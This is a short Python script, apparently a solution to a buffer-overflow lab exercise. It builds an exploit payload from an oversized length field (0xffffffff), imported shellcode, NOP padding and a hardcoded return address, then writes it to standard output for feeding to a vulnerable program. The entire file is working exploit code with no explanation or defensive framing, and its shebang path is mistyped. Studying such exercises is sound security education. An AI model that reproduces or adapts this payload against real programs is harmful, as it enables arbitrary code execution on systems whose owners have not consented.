#!/user/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

paddit = pack("<I",0x90909090)*5
shellAdd = pack("<I",0xfffee860)
sizeI = pack("<I", 0xffffffff)
payload =  sizeI + shellcode + b'\x90' + paddit + shellAdd 
sys.stdout.buffer.write(payload)
